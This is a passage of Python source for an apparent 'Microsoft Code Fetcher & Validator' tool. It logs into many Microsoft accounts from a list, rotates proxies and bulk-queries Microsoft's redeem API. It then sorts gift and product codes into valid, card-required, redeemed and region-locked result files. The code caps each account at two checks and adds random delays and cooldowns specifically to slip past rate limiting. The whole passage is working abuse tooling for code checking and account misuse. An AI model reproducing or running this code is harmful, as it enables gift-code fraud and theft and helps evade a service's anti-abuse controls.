            'locale': 'en-GB',
            'msaTicket': token,
            'pageFormat': 'full',
            'urlRef': 'https://account.microsoft.com/billing/redeem',
            'isRedeem': 'true',
            'clientType': 'AccountMicrosoftCom',
            'layout': 'Inline',
            'cssOverride': 'AMC',
            'scenario': 'redeem',
            'timeToInvokeIframe': '4977',
            'sdkVersion': 'VERSION_PLACEHOLDER'
        }
        
        try:
            response = session.post(url, params=params, data=payload, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        except Exception:
            return None
            
        text = response.text
        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
        if not match:
            return None
            
        try:
            store_state = json.loads(match.group(1))
            extracted_values = {
                'ms_cv': store_state.get('appContext', {}).get('cv', ''),
                'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
                'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
                'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
                'muid': store_state.get('appContext', {}).get('muid', ''),
                'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
            }
            
            session.store_state = extracted_values
            return extracted_values
            
        except json.JSONDecodeError:
            return None
            
    except Exception:
        return None

async def prepare_redeem_api_call(session, code, headers, payload):
    """Prepare redeem API call"""
    try:
        loop = asyncio.get_event_loop()
        response = await loop.run_in_executor(
            None,
            lambda: session.post(
                'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
                headers=headers,
                json=payload,
                timeout=REQUEST_TIMEOUT
            )
        )
        return response
    except Exception:
        return None

async def validate_code_primary(session, code, force_refresh_ids=False, token=None):
    """Primary validation function"""
    try:
        if not code or len(code) < 5 or ' ' in code:
            return {"status": "INVALID", "message": "Invalid code format"}
        
        if not circuit_breaker.can_make_request("buynow.production.store-web.dynamics.com"):
            return {"status": "RATE_LIMITED", "message": "Endpoint rate limited (circuit breaker)"}
        
        store_state = get_store_cart_state(session, force_refresh=force_refresh_ids, token=token)
        if not store_state:
            store_state = get_store_cart_state(session, force_refresh=True, token=token)
            if not store_state:
                return {"status": "ERROR", "message": "Failed to get store cart state"}
        
        try:
            headers = {
                "host": "buynow.production.store-web.dynamics.com",
                "connection": "keep-alive",
                "x-ms-tracking-id": store_state['tracking_id'],
                "sec-ch-ua-platform": "\"Windows\"",
                "authorization": f"WLID1.0=t={token}",
                "x-ms-client-type": "AccountMicrosoftCom",
                "x-ms-market": "US",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Microsoft Edge\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "ms-cv": store_state['ms_cv'],
                "sec-ch-ua-mobile": "?0",
                "x-ms-reference-id": generate_reference_id(),
                "x-ms-vector-id": store_state['vector_id'],
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
                "x-ms-correlation-id": store_state['correlation_id'],
                "content-type": "application/json",
                "x-authorization-muid": store_state['alternative_muid'],
                "accept": "*/*",
                "origin": "https://www.microsoft.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.microsoft.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9"
            }
            
            payload = {
                "market": "US",
                "language": "en-US",
                "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_adddatapropertyiap","sc_addgifteeduringordercreation","sc_aemparamforimage","sc_aemrdslocale","sc_allowalipayforcheckout","sc_allowbuynowrupay","sc_allowcustompifiltering","sc_allowelo","sc_allowfincastlerewardsforsubs","sc_allowmpesapi","sc_allowparallelorderload","sc_allowpaypay","sc_allowpaypayforcheckout","sc_allowpaysafecard","sc_allowpaysafeforus","sc_allowrupay","sc_allowrupayforcheckout","sc_allowsmdmarkettobeprimarypi","sc_allowupi","sc_allowupiforbuynow","sc_allowupiforcheckout","sc_allowupiqr","sc_allowupiqrforbuynow","sc_allowupiqrforcheckout","sc_allowvenmo","sc_allowvenmoforbuynow","sc_allowvenmoforcheckout","sc_allowverve","sc_analyticsforbuynow","sc_announcementtsenabled","sc_apperrorboundarytsenabled","sc_askaparentinsufficientbalance","sc_askaparentssr","sc_askaparenttsenabled","sc_asyncpiurlupdate","sc_asyncpurchasefailure","sc_asyncpurchasefailurexboxcom","sc_authactionts","sc_autorenewalconsentnarratorfix","sc_bankchallenge","sc_bankchallengecheckout","sc_blockcsvpurchasefrombuynow","sc_blocklegacyupgrade","sc_buynowfocustrapkeydown","sc_buynowglobalpiadd","sc_buynowlistpichanges","sc_buynowprodigilegalstrings","sc_buynowuipreload","sc_buynowuiprod","sc_cartcofincastle","sc_cartrailexperimentv2","sc_cawarrantytermsv2","sc_checkoutglobalpiadd","sc_checkoutitemfontweight","sc_checkoutredeem","sc_clientdebuginfo","sc_clienttelemetryforceenabled","sc_clienttorequestorid","sc_contactpreferenceactionts","sc_contactpreferenceupdate","sc_contactpreferenceupdatexboxcom","sc_conversionblockederror","sc_copycurrentcart","sc_cpdeclinedv2","sc_culturemarketinfo","sc_cvvforredeem","sc_dapsd2challenge","sc_delayretry","sc_deliverycostactionts","sc_devicerepairpifilter","sc_digitallicenseterms","sc_disableupgradetrycheckout","sc_discountfixforfreetrial","sc_documentrefenabled","sc_eligibilityapi","sc_emptyresultcheck","sc_enablecartcreationerrorparsing","sc_enablekakaopay","sc_errorpageviewfix","sc_errorstringsts","sc_euomnibusprice","sc_expandedpurchasespinner","sc_extendpagetagtooverride","sc_fetchlivepersonfromparentwindow","sc_fincastlebuynowallowlist","sc_fincastlebuynowv2strings","sc_fincastlecalculation","sc_fincastlecallerapplicationidcheck","sc_fincastleui","sc_fingerprinttagginglazyload","sc_fixforcalculatingtax","sc_fixredeemautorenew","sc_flexibleoffers","sc_flexsubs","sc_giftingtelemetryfix","sc_giftlabelsupdate","sc_giftserversiderendering","sc_globalhidecssphonenumber","sc_greenshipping","sc_handledccemptyresponse","sc_hidegcolinefees","sc_hidesubscriptionprice","sc_highresolutionimageforredeem","sc_hipercard","sc_imagelazyload","sc_inlineshippingselectormsa","sc_inlinetempfix","sc_isnegativeoptionruleenabled","sc_isremovesubardigitalattach","sc_jarvisconsumerprofile","sc_jarvisinvalidculture","sc_klarna","sc_lineitemactionts","sc_livepersonlistener","sc_loadingspinner","sc_lowbardiscountmap","sc_mapinapppostdata","sc_marketswithmigratingcssphonenumber","sc_moraycarousel","sc_moraystyle","sc_moraystylefull","sc_narratoraddress","sc_newcheckoutselectorforxboxcom","sc_newconversionurl","sc_newflexiblepaymentsmessage","sc_newrecoprod","sc_noawaitforupdateordercall","sc_norcalifornialaw","sc_norcalifornialawlog","sc_norcalifornialawstate","sc_nornewacceptterms","sc_officescds","sc_optionalcatalogclienttype","sc_ordercheckoutfix","sc_orderpisyncdisabled","sc_orderstatusoverridemstfix","sc_outofstock","sc_passthroughculture","sc_paymentchallengets","sc_paymentoptionnotfound","sc_paymentsessioninsummarypage","sc_pidlignoreesckey","sc_pitelemetryupdates","sc_preloadpidlcontainerts","sc_productforlicenseterms","sc_productimageoptimization","sc_prominenteddchange","sc_promocode","sc_promocodecheckout","sc_purchaseblock","sc_purchaseblockerrorhandling","sc_purchasedblocked","sc_purchasedblockedby","sc_quantitycap","sc_railv2","sc_reactcheckout","sc_readytopurchasefix","sc_redeemfocusforce","sc_reloadiflineitemdiscrepancy","sc_removepaddingctalegaltext","sc_removeresellerforstoreapp","sc_resellerdetail","sc_restoregiftfieldlimits","sc_returnoospsatocart","sc_routechangemessagetoxboxcom","sc_rspv2","sc_scenariotelemetryrefactor","sc_separatedigitallicenseterms","sc_setbehaviordefaultvalue","sc_shippingallowlist","sc_showcontactsupportlink","sc_showtax","sc_skippurchaseconfirm","sc_skipselectpi","sc_splipidltresourcehelper","sc_splittaxv2","sc_staticassetsimport","sc_surveyurlv2","sc_taxamountsubjecttochange","sc_testflight","sc_twomonthslegalstringforcn","sc_updateallowedpaymentmethodstoadd","sc_updatebillinginfo","sc_updatedcontactpreferencemarkets","sc_updateformatjsx","sc_updatetosubscriptionpricev2","sc_updatewarrantycompletesurfaceproinlinelegalterm","sc_updatewarrantytermslink","sc_usefullminimaluhf","sc_usehttpsurlstrings","sc_uuid","sc_xboxcomnosapi","sc_xboxrecofix","sc_xboxredirection","sc_xdlshipbuffer"],
                "tokenIdentifierValue": code,
                "supportsCsvTypeTokenOnly": False,
                "buyNowScenario": "redeem",
                "clientContext": {
                    "client": "AccountMicrosoftCom",
                    "deviceFamily": "Web"
                }
            }

            response = await prepare_redeem_api_call(session, code, headers, payload)
            
            if not response:
                circuit_breaker.record_failure("buynow.production.store-web.dynamics.com")
                if hasattr(session, 'current_proxy_raw'):
                    proxy_manager.record_failure(session.current_proxy_raw, "Request failed")
                return {"status": "ERROR", "message": "Request failed"}
        except Exception as e:
            circuit_breaker.record_failure("buynow.production.store-web.dynamics.com")
            if hasattr(session, 'current_proxy_raw'):
                proxy_manager.record_failure(session.current_proxy_raw, str(e))
            return {"status": "ERROR", "message": f"Request failed: {str(e)}"}
        
        if response.status_code == 429:
            circuit_breaker.record_failure("buynow.production.store-web.dynamics.com")
            if hasattr(session, 'current_proxy_raw'):
                proxy_manager.record_failure(session.current_proxy_raw, "HTTP 429")
            return {"status": "RATE_LIMITED", "message": "Account rate limited (HTTP 429)"}
                
        if response.status_code != 200:
            return {"status": "ERROR", "message": f"Request failed with status {response.status_code}"}
            
        data = response.json()

        if "tokenType" in data and data["tokenType"] == "CSV":
            value = data.get("value")
            currency = data.get("currency")
            circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
            if hasattr(session, 'current_proxy_raw'):
                proxy_manager.record_success(session.current_proxy_raw)
            return {"status": "BALANCE_CODE", "message": f"{code} | {value} {currency}"}
        
        if "errorCode" in data and data["errorCode"] == "TooManyRequests":
            circuit_breaker.record_failure("buynow.production.store-web.dynamics.com")
            if hasattr(session, 'current_proxy_raw'):
                proxy_manager.record_failure(session.current_proxy_raw, "TooManyRequests")
            return {"status": "RATE_LIMITED", "message": "Account rate limited (TooManyRequests)"}
        
        if "error" in data and isinstance(data["error"], dict) and "code" in data["error"]:
            if data["error"]["code"] == "TooManyRequests" or "rate" in data["error"].get("message", "").lower():
                circuit_breaker.record_failure("buynow.production.store-web.dynamics.com")
                if hasattr(session, 'current_proxy_raw'):
                    proxy_manager.record_failure(session.current_proxy_raw, "Rate limited")
                return {"status": "RATE_LIMITED", "message": "Account rate limited (error message)"}
        
        if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
            cart_event = data["events"]["cart"][0]
            
            if "type" in cart_event and cart_event["type"] == "error":
                if cart_event.get("code") == "TooManyRequests" or "TooManyRequests" in str(cart_event):
                    circuit_breaker.record_failure("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_failure(session.current_proxy_raw, "Cart rate limited")
                    return {"status": "RATE_LIMITED", "message": "Account rate limited (cart event)"}
            
            if "data" in cart_event and "reason" in cart_event["data"]:
                reason = cart_event["data"]["reason"]
                
                if "TooManyRequests" in reason or "RateLimit" in reason:
                    circuit_breaker.record_failure("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_failure(session.current_proxy_raw, f"Rate limit: {reason}")
                    return {"status": "RATE_LIMITED", "message": f"Account rate limited ({reason})"}
                
                if reason == "RedeemTokenAlreadyRedeemed":
                    circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_success(session.current_proxy_raw)
                    return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
                
                elif reason in ["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", 
                               "RedeemTokenNoMatchingOrEligibleProductsFound"]:
                    circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_success(session.current_proxy_raw)
                    return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
                
                elif reason == "RedeemTokenStateDeactivated":
                    circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_success(session.current_proxy_raw)
                    return {"status": "DEACTIVATED", "message": f"{code} | DEACTIVATED"}
                
                elif reason == "RedeemTokenGeoFencingError":
                    circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_success(session.current_proxy_raw)
                    return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
                
                elif reason in ["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"]:
                    circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_success(session.current_proxy_raw)
                    return {"status": "INVALID", "message": f"{code} | INVALID"}
                
                else:
                    circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_success(session.current_proxy_raw)
                    return {"status": "INVALID", "message": f"{code} | INVALID"}
        
        if "products" in data and len(data["products"]) > 0:
            product_info = data.get("productInfos", [{}])[0]
            product_id = product_info.get("productId")
            
            for product in data["products"]:
                if product.get("id") == product_id and "sku" in product and product["sku"]:
                    product_title = product["sku"].get("title", "Unknown Title")
                    is_pi_required = product_info.get("isPIRequired", False)
                    
                    circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_success(session.current_proxy_raw)
                    if is_pi_required:
                        return {
                            "status": "VALID_REQUIRES_CARD",
                            "product_title": product_title,
                            "message": f"{code} | {product_title}"
                        }
                    else:
                        return {
                            "status": "VALID",
                            "product_title": product_title,
                            "message": f"{code} | {product_title}"
                        }
                elif product.get("id") == product_id:
                    product_title = product.get("title", "Unknown Title")
                    is_pi_required = product_info.get("isPIRequired", False)
                    
                    circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
                    if hasattr(session, 'current_proxy_raw'):
                        proxy_manager.record_success(session.current_proxy_raw)
                    if is_pi_required:
                        return {
                            "status": "VALID_REQUIRES_CARD",
                            "product_title": product_title,
                            "message": f"{code} | {product_title}"
                        }
                    else:
                        return {
                            "status": "VALID",
                            "product_title": product_title,
                            "message": f"{code} | {product_title}"
                        }
        
        circuit_breaker.record_success("buynow.production.store-web.dynamics.com")
        if hasattr(session, 'current_proxy_raw'):
            proxy_manager.record_success(session.current_proxy_raw)
        return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}
        
    except Exception as e:
        circuit_breaker.record_failure("buynow.production.store-web.dynamics.com")
        if hasattr(session, 'current_proxy_raw'):
            proxy_manager.record_failure(session.current_proxy_raw, str(e))
        return {"status": "ERROR", "message": f"{code} | Error: {str(e)}"}

async def validate_code(session, code, force_refresh_ids=False, token=None):
    """Wrapper for validation"""
    try:
        result = await validate_code_primary(session, code, force_refresh_ids, token)
        status = result.get('status', 'ERROR')
        message = result.get('message', 'Unknown error')
        
        if status == 'VALID':
            title = result['product_title'] if 'product_title' in result else message.split(' | ')[-1] if ' | ' in message else "Unknown Title"
            print_colored(f"{code} | {title}", Fore.GREEN)
            return result
        elif status == 'VALID_REQUIRES_CARD':
            title = result['product_title'] if 'product_title' in result else message.split(' | ')[-1] if ' | ' in message else "Unknown Title"
            print_colored(f"{code} | {title}", Fore.YELLOW)
            return result
        elif status == 'REDEEMED':
            print_colored(f"{code} | REDEEMED", Fore.RED)
            return result
        elif status == 'EXPIRED':
            print_colored(f"{code} | EXPIRED", Fore.RED)
            return result
        elif status == 'REGION_LOCKED':
            print_colored(f"{code} | REGION_LOCKED", Fore.MAGENTA)
            return result
        elif status == 'UNKNOWN':
            print_colored(f"{code} | UNKNOWN", Fore.YELLOW)
            return result
        elif status == 'BALANCE_CODE':
            print_colored(f"{code} | {message.split(' | ', 1)[1] if ' | ' in message else message}", Fore.GREEN)
            return result
        elif status == 'RATE_LIMITED':
            return result
        else:
            print_colored(f"{code} | {result['status']}", Fore.RED)
            return result
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

async def process_code_check(session, code, email, results_folder, token):
    """Process single code check"""
    try:
        with processed_codes_lock:
            if code in processed_codes:
                return True, False
        
        result = await validate_code(session, code, force_refresh_ids=False, token=token)
        status = result.get('status', 'ERROR')

        if status == 'ERROR':
            return False, False

        elif status == 'RATE_LIMITED':
            return False, True

        else:
            file_key = None
            if status in ['VALID', 'VALID_REQUIRES_CARD']:
                file_key = status
            elif status == 'BALANCE_CODE':
                file_key = 'VALID'
            elif status in ['REDEEMED', 'EXPIRED', 'DEACTIVATED', 'INVALID']:
                file_key = 'INVALID'
            elif status in ['REGION_LOCKED', 'UNKNOWN']:
                file_key = status
            
            if not file_key:
                file_key = 'INVALID'
            
            result_line = f"{result.get('message', f'{code} | {status}')}\n"
            
            with processed_codes_lock:
                if file_key in results_count:
                    results_count[file_key] += 1
                if code not in processed_codes:
                    processed_codes.add(code)
                
                if file_key == 'VALID':
                    with open(f"{results_folder}/valid_codes.txt", "a") as f:
                        f.write(result_line)
                elif file_key == 'VALID_REQUIRES_CARD':
                    with open(f"{results_folder}/valid_cardrequired_codes.txt", "a") as f:
                        f.write(result_line)
                elif file_key == 'REGION_LOCKED':
                    with open(f"{results_folder}/region_locked_codes.txt", "a") as f:
                        f.write(result_line)
                elif file_key == 'INVALID':
                    with open(f"{results_folder}/invalid.txt", "a") as f:
                        f.write(result_line)
                elif file_key == 'UNKNOWN':
                    with open(f"{results_folder}/unknown_codes.txt", "a") as f:
                        f.write(result_line)

            return True, False

    except Exception as e:
        return False, False

def process_codes_for_account_validation(account, codes_queue, results_folder, total_codes):
    """Process codes for a single account during validation"""
    email, password = account
    
    time.sleep(random.uniform(0.5, 2.0))
    
    session, token = login_microsoft_for_validation(email, password)

    if not session or not token:
        print_colored(f"[ - ] VALIDATION LOGIN FAILED = {email}", Fore.RED)
        return

    print_colored(f"[ + ] VALIDATION LOGIN SUCCESS = {email}", Fore.GREEN)
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        code_count = 0
        max_codes_per_account = 2  # Very conservative to avoid rate limiting
        
        while code_count < max_codes_per_account:
            with processed_codes_lock:
                if len(processed_codes) >= total_codes:
                    return
            
            try:
                code = codes_queue.get(timeout=5)
            except queue.Empty:
                with processed_codes_lock:
                    remaining_codes = total_codes - len(processed_codes)
                if remaining_codes <= 0:
                    return
                continue
            
            try:
                # Add delay between code validations
                if code_count > 0:
                    time.sleep(random.uniform(5.0, 10.0))
                
                success, is_rate_limited = loop.run_until_complete(
                    process_code_check(session, code, email, results_folder, token)
                )
                
                code_count += 1
                
                with processed_codes_lock:
                    if len(processed_codes) >= total_codes:
                        return
                
                if is_rate_limited:
                    codes_queue.put(code)
                    print_colored(f"[ ! ] RATE LIMITED = {email} after {code_count} codes", Fore.YELLOW)
                    
                    # Long cooldown after rate limit
                    time.sleep(random.uniform(60.0, 120.0))
                    return
                elif not success:
                    codes_queue.put(code)
                    
                update_titlebar_phase2(len(processed_codes), total_codes, callback)
            except Exception:
                codes_queue.put(code)
            finally:
                codes_queue.task_done()
    finally:
        loop.close()
        if session:
            try:
                session.close()
            except:
                pass

def read_codes_from_file(filename="fetched_codes.txt"):
    """Read codes from a file"""
    if not os.path.exists(filename):
        print(f"{Fore.RED}File {filename} not found.{Fore.RESET}")
        return []
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            codes = [line.strip() for line in f if line.strip()]
        print(f"{Fore.GREEN}✓ Loaded {len(codes)} codes from {filename}{Fore.RESET}")
        return codes
    except Exception as e:
        print(f"{Fore.RED}✗ Error reading codes file: {str(e)}{Fore.RESET}")
        return []

def phase2_validate_codes(accounts, codes=None, callback=None):
    """Phase 2: Validate fetched codes"""
    if codes is None:
        codes = read_codes_from_file("fetched_codes.txt")
    
    if not codes:
        print(f"{Fore.YELLOW}No codes to validate.{Fore.RESET}")
        return
    
    print(f"{Fore.CYAN}=== Starting Phase 2: Validating {len(codes)} codes ==={Fore.RESET}")
    
    # Create results folder
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_folder = f"validation_results_{timestamp}"
    os.makedirs(results_folder, exist_ok=True)
    
    # Create result files
    for file_name in ["valid_codes.txt", "valid_cardrequired_codes.txt", "invalid.txt", "unknown_codes.txt", "region_locked_codes.txt"]:
        with open(f"{results_folder}/{file_name}", "w"):
            pass
    
    # Reset counters
    global results_count, processed_codes
    results_count = {'VALID': 0, 'VALID_REQUIRES_CARD': 0, 'REGION_LOCKED': 0, 'INVALID': 0, 'UNKNOWN': 0}
    processed_codes = set()
    
    # Create code queue
    codes_queue = queue.Queue()
    for code in codes:
        codes_queue.put(code)
    
    update_titlebar_phase2(0, len(codes))
    
    # Auto-set batch size
    batch_size = min(MAX_THREADS_VALIDATOR, len(accounts))
    print(f"{Fore.CYAN}Using {batch_size} threads for validation{Fore.RESET}")
    print(f"{Fore.CYAN}Proxies: {proxy_manager.get_stats()}{Fore.RESET}")
    print(f"{Fore.YELLOW}Each account will check max 2 codes to avoid rate limiting{Fore.RESET}")
    
    processed_count = 0
    while processed_count < len(codes):
        with ThreadPoolExecutor(max_workers=batch_size) as executor:
            futures = []
            batch_accounts = accounts[:batch_size]
            
            for account in batch_accounts:
                future = executor.submit(
                    process_codes_for_account_validation,
                    account,
                    codes_queue,
                    results_folder,
                    len(codes)
                )
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        
        with processed_codes_lock:
            processed_count = len(processed_codes)
        
        if processed_count < len(codes):
            print(f"{Fore.YELLOW}[ ⏳ ] Processed {processed_count}/{len(codes)} codes. Continuing with next batch...{Fore.RESET}")
            time.sleep(random.uniform(20.0, 30.0))
    
    print(f"{Fore.GREEN}✓ Validation completed!{Fore.RESET}")
    print(f"{Fore.CYAN}Results saved in: {results_folder}/{Fore.RESET}")
    
    # Print summary
    print(f"\n{Fore.CYAN}=== Validation Summary ==={Fore.RESET}")
    print(f"{Fore.GREEN}Valid Codes: {results_count.get('VALID', 0)}{Fore.RESET}")
    print(f"{Fore.YELLOW}Valid (Requires Card): {results_count.get('VALID_REQUIRES_CARD', 0)}{Fore.RESET}")
    print(f"{Fore.MAGENTA}Region Locked: {results_count.get('REGION_LOCKED', 0)}{Fore.RESET}")
    print(f"{Fore.RED}Invalid: {results_count.get('INVALID', 0)}{Fore.RESET}")
    print(f"{Fore.YELLOW}Unknown: {results_count.get('UNKNOWN', 0)}{Fore.RESET}")

def display_menu():
    """Display the main menu"""
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════╗{Fore.RESET}")
    print(f"{Fore.CYAN}  ║   Microsoft Code Fetcher & Validator ║{Fore.RESET}")
    print(f"{Fore.CYAN}  ║           Made by @itz_valtera       ║{Fore.RESET}")
    print(f"{Fore.CYAN}  ╚══════════════════════════════════════╝{Fore.RESET}")
    print()
    print(f"{Fore.YELLOW}╔══════════════════════════════════════╗{Fore.RESET}")
    print(f"{Fore.YELLOW}║            MAIN MENU                 ║{Fore.RESET}")
    print(f"{Fore.YELLOW}╠══════════════════════════════════════╣{Fore.RESET}")
    print(f"{Fore.YELLOW}║ 1. Fetch Codes Only                  ║{Fore.RESET}")
    print(f"{Fore.YELLOW}║ 2. Validate Codes Only               ║{Fore.RESET}")
    print(f"{Fore.YELLOW}║ 3. Both Fetch & Validate             ║{Fore.RESET}")
    print(f"{Fore.YELLOW}║ 4. Exit                             ║{Fore.RESET}")
    print(f"{Fore.YELLOW}╚══════════════════════════════════════╝{Fore.RESET}")
    print()

def run_fetch_only(accounts):
    """Run only the fetch phase"""
    print(f"{Fore.CYAN}=== RUNNING FETCH ONLY ==={Fore.RESET}")
    phase1_fetch_codes(accounts)
    
    if os.path.exists("promos.txt"):
        print(f"\n{Fore.MAGENTA}=== PROMO CODES FOUND ==={Fore.RESET}")
        with open("promos.txt", 'r') as f:
            for line in f:
                print(f"{Fore.MAGENTA}{line.strip()}{Fore.RESET}")

def run_validate_only(accounts):
    """Run only the validate phase"""
    print(f"{Fore.CYAN}=== RUNNING VALIDATE ONLY ==={Fore.RESET}")
    phase2_validate_codes(accounts)

def run_both(accounts):
    """Run both fetch and validate phases"""
    print(f"{Fore.CYAN}=== RUNNING BOTH PHASES ==={Fore.RESET}")
    
    # Phase 1: Fetch codes
    phase1_fetch_codes(accounts)
    
    if not fetched_codes:
        print(f"{Fore.RED}No codes were found. Exiting.{Fore.RESET}")
        return
    
    # Ask if we should proceed to validation
    choice = input(f"\n{Fore.CYAN}Proceed to validation? (y/n): {Style.RESET_ALL}").strip().lower()
    if choice == 'y':
        # Add cooldown between phases
        print(f"{Fore.YELLOW}[ ⏳ ] Cooling down for 30 seconds before validation...{Fore.RESET}")
        time.sleep(30)
        
        # Phase 2: Validate codes
        phase2_validate_codes(accounts, fetched_codes)
    else:
        print(f"{Fore.YELLOW}Skipping validation phase.{Fore.RESET}")

def main():
    """Main function"""
    try:
        # Load proxies (optional)
        proxy_manager.load_proxies()
        
        # Read accounts
        accounts = read_accounts()
        if not accounts:
            return
        
        while True:
            display_menu()
            choice = input(f"{Fore.CYAN}Select option (1-4): {Style.RESET_ALL}").strip()
            
            if choice == '1':
                run_fetch_only(accounts)
            elif choice == '2':
                run_validate_only(accounts)
            elif choice == '3':
                run_both(accounts)
            elif choice == '4':
                print(f"{Fore.YELLOW}Exiting program...{Fore.RESET}")
                break
            else:
                print(f"{Fore.RED}Invalid choice. Please select 1-4.{Style.RESET_ALL}")
                continue
            
            # Ask if user wants to return to menu
            if choice in ['1', '2', '3']:
                print(f"\n{Fore.CYAN}Return to main menu? (y/n): {Style.RESET_ALL}", end="")
                menu_choice = input().strip().lower()
                if menu_choice != 'y':
                    print(f"{Fore.YELLOW}Exiting program...{Fore.RESET}")
                    break
                
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Program interrupted by user.{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}Unexpected error: {str(e)}{Fore.RESET}")

if __name__ == "__main__":
    main()